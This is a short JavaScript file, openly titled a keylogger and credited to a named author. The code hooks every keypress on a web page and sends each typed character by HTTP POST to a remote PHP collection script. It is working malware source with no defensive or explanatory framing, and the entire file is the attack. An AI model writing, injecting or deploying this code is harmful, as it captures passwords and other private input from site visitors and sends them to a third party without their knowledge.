/*
Simple javascript keylogger by sarbesh kumar sarkar
*/

document.onkeypress = function(evt) {
   evt = evt || window.event
   key = String.fromCharCode(evt.charCode)
   if (key) {
      var http = new XMLHttpRequest();
      var param = encodeURI(key)
      http.open("POST","http://server/directory/keylogger.php",true);
      http.setRequestHeader("Content-type","application/x-www-form-urlencoded");
      http.send("key="+param);
   }
}
